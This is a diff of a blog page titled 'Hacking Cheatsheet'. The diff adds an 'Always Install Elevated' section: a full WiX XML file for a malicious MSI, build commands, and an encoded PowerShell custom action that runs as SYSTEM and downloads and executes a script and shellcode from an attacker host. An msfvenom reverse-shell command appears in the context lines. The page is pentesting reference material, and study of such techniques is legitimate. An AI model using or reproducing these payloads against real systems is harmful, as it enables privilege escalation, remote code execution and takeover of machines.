@@ -27,7 +27,7 @@ Hacking Cheatsheet :: Ceso Adventures
 <meta itemprop=name content="Hacking Cheatsheet">
 <meta itemprop=description content="My humble cheatsheet of most used tools, webs, etc"><meta itemprop=datePublished content="2020-04-07T02:30:30+00:00">
 <meta itemprop=dateModified content="2020-04-07T02:30:30+00:00">
-<meta itemprop=wordCount content="4655"><meta itemprop=image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
+<meta itemprop=wordCount content="4809"><meta itemprop=image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
 <meta itemprop=keywords content="blog,cheatsheet,hacking,linux,windows,exfiltration,privilegeescalation,">
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
@@ -62,7 +62,7 @@ Hacking Cheatsheet :: Ceso Adventures
 <div class=content>
 <div class=post>
 <div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>22 minutes
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>23 minutes
 </p>
 </div>
 <h2 class=post-title><a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/>Hacking Cheatsheet</a></h2>
@@ -217,6 +217,8 @@ Hacking Cheatsheet :: Ceso Adventures
 <a href=#windows-2>Windows</a>
 <ul>
 <li>
+<a href=#always-install-elevated>Always Install Elevated</a>
+</li><li>
 <a href=#run-as>Run-As</a>
 </li><li>
 <a href=#incorrect-permisions-in-services-sc-config-binpath>Incorrect permisions in services (sc config binpath)</a>
@@ -606,7 +608,39 @@ run -j
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
 </code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2>
 <h3 id=windows-2>Windows</h3>
-<h4 id=run-as>Run-As</h4>
+<h4 id=always-install-elevated>Always Install Elevated</h4>
+<p>If we have enabled a privilege which allow us to ALWAYS install with elevated privileges, we can craft a .msi leveranging wixtools, specifically with candl.exe and light.exe.
+The steps are as follows:</p>
+<p>1 - Create a malicious .xml wix file:</p>
+<pre tabindex=0><code class=language-texinfo data-lang=texinfo>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt;
+    &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt;
+        &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt;
+        &lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&gt;
+        &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt;
+            &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt;
+                &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt;
+                 &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt;
+                    &lt;/Component&gt;
+                &lt;/Directory&gt;
+            &lt;/Directory&gt;
+        &lt;/Directory&gt;
+        &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt;
+            &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt;
+        &lt;/Feature&gt;
+        &lt;CustomAction Id=&quot;SystemShell&quot; Directory=&quot;TARGETDIR&quot; ExeCommand=&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADIALwBuAGkAZQByAGkALgBwAHMAMQAnACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADkAMgAvAHIAdQBuAC0AcwBoAGUAbABsAGMAbwBkAGUALQA2ADQAYgBpAHQALgBwAHMAMQAtAGYAcgBvAG0AOQAyAC0AOAAwADgAMQBwAG8AcgB0ACcAKQAKAA==&quot; Execute=&quot;deferred&quot; Impersonate=&quot;no&quot; Return=&quot;ignore&quot;/&gt;
+        &lt;InstallExecuteSequence&gt;
+            &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt;
+        &lt;/InstallExecuteSequence&gt;
+    &lt;/Product&gt;
+&lt;/Wix&gt;
+</code></pre><p>The powershell in b64 executed is this one:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>IEX(New-Object Net.Webclient).downloadString(<span style=color:#e6db74>&#39;http://attacker/nieri.ps1&#39;</span>);IEX(New-Object Net.Webclient).downloadString(<span style=color:#e6db74>&#39;http://attacker/run-shellcode-64bit.ps1&#39;</span>)
+</code></pre></div><p>2 - Create a malicious .wix (this step and next one MUST be run from the path where the wix tools are located)</p>
+<pre tabindex=0><code class=language-texinfo data-lang=texinfo>candle.exe ..\bad-wix-pe.xml -out ..\reverse.wix
+</code></pre><p>3 - Create the malicious .msi from the .wix</p>
+<pre tabindex=0><code class=language-texinfo data-lang=texinfo>light.exe ..\reverse.wix -out ..\vamosvamos.msi
+</code></pre><h4 id=run-as>Run-As</h4>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
 PS C:\&gt; $username = &#34;&lt;domain&gt;\&lt;user&gt;&#34;
 PS C:\&gt; $password = &#39;&lt;password&gt;&#39;
